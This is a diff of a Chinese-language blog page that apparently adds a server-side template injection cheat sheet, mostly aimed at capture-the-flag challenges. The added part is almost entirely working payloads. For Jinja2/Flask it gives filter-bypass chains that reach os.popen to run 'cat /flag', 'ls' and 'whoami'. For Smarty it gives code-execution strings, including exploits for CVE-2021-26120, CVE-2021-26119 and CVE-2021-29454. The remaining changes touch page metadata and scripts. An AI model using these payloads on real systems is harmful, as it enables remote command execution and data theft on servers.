@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/background/fj_img/33.jpg">
 <meta property="article:published_time" content="2023-01-01T02:36:13.000Z">
-<meta property="article:modified_time" content="2024-07-29T08:38:24.883Z">
+<meta property="article:modified_time" content="2024-09-07T05:41:25.551Z">
 <meta property="article:author" content="dddkia">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="ssti">
@@ -282,7 +282,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.3k 字
+          13k 字
         
       </span>
     
@@ -293,7 +293,7 @@
         
         
         
-          27 分钟
+          53 分钟
         
       </span>
     
@@ -439,6 +439,41 @@ target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python
 <h6 id="过滤单双引号">过滤单双引号'/"</h6>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python">&#123;&#123;config.__class__.__init__.__globals__[request.args.m].popen(request.args.command).read()&#125;&#125;&amp;m=os&amp;command=cat%<span class="hljs-number">20</span>/flag<br>&#123;&#123;lipsum.__globals__.os.popen(request.values.gg).read()&#125;&#125;&amp;gg=cat /flag<br>&#123;&#123;lipsum.__globals__.os.popen(request.cookies.get(<span class="hljs-string">&#x27;aa&#x27;</span>).read()&#125;&#125; Cookie:aa=cat /flag<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=().__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">139</span>].__init__.__globals__.__builtins__.<span class="hljs-built_in">chr</span>%&#125;&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">139</span>].__init__.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>)%2Bchr(<span class="hljs-number">115</span>)).popen(<span class="hljs-built_in">chr</span>(<span class="hljs-number">119</span>)%2Bchr(<span class="hljs-number">104</span>)%2Bchr(<span class="hljs-number">111</span>)%2Bchr(<span class="hljs-number">97</span>)%2Bchr(<span class="hljs-number">109</span>)%2Bchr(<span class="hljs-number">105</span>)).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
 <h6 id="过滤了双花括号">过滤了双花括号</h6>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-meta">%</span>&#125;<br></code></pre></td></tr></table></figure>
+<h6 id="过滤__init__">过滤__init__</h6>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Python">__enter__<br>__exit__<br></code></pre></td></tr></table></figure>
+<h6 id="flask中的特殊方法">Flask中的特殊方法</h6>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Python">url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)<br>url_for.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br>get_flashed_messages.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)<br>get_flashed_messages.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br>lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)              <br>lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br>config.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br>config.__class__.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)<br>foobar.__class__.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;flag&#x27;</span>).read()<br>request.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)<br>application.__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br>self.__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br>cycler.__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br>joiner.__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br>namespace.__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br>g.pop.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()<br></code></pre></td></tr></table></figure>
+<h6 id="特殊字符全过滤">特殊字符全过滤</h6>
+<p>考虑构造字符</p>
+<p>int(): 将值转换为int类型 list(): 将变量列成列表 string():
+将变量转换成字符串 join(): 将一个序列中的参数值拼接成字符串 length():
+返回字符串的长度，别名是count</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&#123;%set one=dict(c=a)|join|count%&#125;<br>&#123;%set two=dict(cc=a)|join|count%&#125;<br>&#123;%set three=dict(ccc=a)|join|count%&#125;<br>&#123;%set four=dict(cccc=a)|join|count%&#125;<br>&#123;%set five=dict(ccccc=a)|join|count%&#125;<br>&#123;%set six=dict(cccccc=a)|join|count%&#125;<br>&#123;%set seven=dict(ccccccc=a)|join|count%&#125;<br>&#123;%set eight=dict(cccccccc=a)|join|count%&#125;<br>&#123;%set nine=dict(ccccccccc=a)|join|count%&#125;<br>&#123;%set po1=dict(po=a,p=a)|join%&#125;<br>&#123;%set xiahuaxian=(lipsum|string|list)|attr(po1)(three*eight)%&#125;<br>&#123;%set gl=(xiahuaxian,xiahuaxian,dict(gl=a,obals=a)|join,xiahuaxian,xiahuaxian)|join%&#125;<br>&#123;%set ge=dict(ge=a,t=a)|join%&#125;<br>&#123;%set o=dict(o=a,s=a)|join%&#125;<br>&#123;%set po2=dict(po=a,pen=a)|join%&#125;<br>&#123;%set bu=(xiahuaxian,xiahuaxian,dict(bu=a,iltins=a)|join,xiahuaxian,xiahuaxian)|join%&#125;<br>&#123;%set ch=(lipsum|attr(gl))|attr(ge)(bu)|attr(ge)(dict(chr=a)|join)%&#125;<br>&#123;%set rce=ch(three*six*six)%2bch(four*five*six-five)%2bch(four*eight)%2bch(six*eight-one)%&#125;<br>&#123;%set re=dict(re=a,ad=a)|join%&#125;<br>&#123;%print (lipsum|attr(gl))|attr(ge)(o)|attr(po2)(rce)|attr(re)()%&#125;<br><br><br>&#123;% set po=dict(po=a,p=b)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%&#125;&#123;% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%&#125;&#123;% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%&#125;&#123;%set re=dict(re=a,ad=a)|join%&#125;&#123;% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%&#125;&#123;%set pp=dict(pop=a,en=b)|join %&#125;&#123;%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(\&#x27;more /flag\&#x27;)|attr(re)())%&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="php">php</h3>
+<h4 id="smarty">Smarty</h4>
+<p>确认版本号（注入点）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">string:&#123;$smarty.version&#125;<br></code></pre></td></tr></table></figure>
+<h5 id="通用版本">通用版本</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python">string:&#123;include file=<span class="hljs-string">&#x27;/flag&#x27;</span>&#125;<br>string:&#123;system(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;<br><span class="hljs-comment">#php5可以用&lt;script language=&quot;php&quot;&gt;</span><br>string:&#123;literal&#125;&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;&#123;/literal&#125;<br></code></pre></td></tr></table></figure>
+<h5 id="旧版本">旧版本</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#通过self调用静态方法</span><br>string:&#123;self::getStreamVariable(<span class="hljs-string">&quot;file:///flag&quot;</span>)&#125;<br><span class="hljs-comment">#在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用</span><br>string:&#123;php&#125;system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)&#123;/php&#125;<br></code></pre></td></tr></table></figure>
+<h5 id="smarty3以上">Smarty3以上</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">string:&#123;<span class="hljs-keyword">if</span> phpinfo()&#125;&#123;/<span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>CVE-2021-26120</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">string:&#123;function name=<span class="hljs-string">&#x27;x()&#123;&#125;;system(&quot;cat /flag&quot;);function &#x27;</span>&#125;&#123;/function&#125;<br></code></pre></td></tr></table></figure>
+<p>CVE-2021-26119</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Python">string:&#123;$smarty.template_object-&gt;smarty-&gt;_getSmartyObj()-&gt;display(<span class="hljs-string">&#x27;string:&#123;system(&quot;cat /flag&quot;)&#125;&#x27;</span>)&#125;<br>string:&#123;$smarty.template_object-&gt;smarty-&gt;enableSecurity()-&gt;display(<span class="hljs-string">&#x27;string:&#123;system(&quot;cat /flag&quot;)&#125;&#x27;</span>)&#125;<br>string:&#123;$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display(<span class="hljs-string">&#x27;string:&#123;system(&quot;cat /flag&quot;)&#125;&#x27;</span>)&#125;<br>string:&#123;$smarty.template_object-&gt;smarty-&gt;addTemplateDir(<span class="hljs-string">&#x27;./x&#x27;</span>)-&gt;display(<span class="hljs-string">&#x27;string:&#123;system(&quot;cat /flag&quot;)&#125;&#x27;</span>)&#125;<br>string:&#123;$smarty.template_object-&gt;smarty-&gt;setTemplateDir(<span class="hljs-string">&#x27;./x&#x27;</span>)-&gt;display(<span class="hljs-string">&#x27;string:&#123;system(&quot;cat /flag&quot;)&#125;&#x27;</span>)&#125;<br>string:&#123;$smarty.template_object-&gt;smarty-&gt;addPluginsDir(<span class="hljs-string">&#x27;./x&#x27;</span>)-&gt;display(<span class="hljs-string">&#x27;string:&#123;system(&quot;cat /flag&quot;)&#125;&#x27;</span>)&#125;<br>string:&#123;$smarty.template_object-&gt;smarty-&gt;setPluginsDir(<span class="hljs-string">&#x27;./x&#x27;</span>)-&gt;display(<span class="hljs-string">&#x27;string:&#123;system(&quot;cat /flag&quot;)&#125;&#x27;</span>)&#125;<br>string:&#123;$smarty.template_object-&gt;smarty-&gt;setCompileDir(<span class="hljs-string">&#x27;./x&#x27;</span>)-&gt;display(<span class="hljs-string">&#x27;string:&#123;system(&quot;cat /flag&quot;)&#125;&#x27;</span>)&#125;<br>string:&#123;$smarty.template_object-&gt;smarty-&gt;setCacheDir(<span class="hljs-string">&#x27;./x&#x27;</span>)-&gt;display(<span class="hljs-string">&#x27;string:&#123;system(&quot;cat /flag&quot;)&#125;&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>
+<p>CVE-2021-29454</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-built_in">eval</span>:&#123;math equation=<span class="hljs-string">&#x27;(&quot;\163\171\163\164\145\155&quot;)(&quot;\167\150\157\141\155\151&quot;)&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="java">java</h3>
+<p>待补充</p>
+<p>https://0314valen.github.io/article/2021-11-23-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(ssti)</p>
+<p>参考</p>
+<p>https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/</p>
+<p>https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/</p>
+<p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</p>
+<p>https://xz.aliyun.com/t/11108</p>
 
                 
               </div>
@@ -861,21 +896,5 @@ target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python
   <noscript>
     <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
   </noscript>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<!--<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>-->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
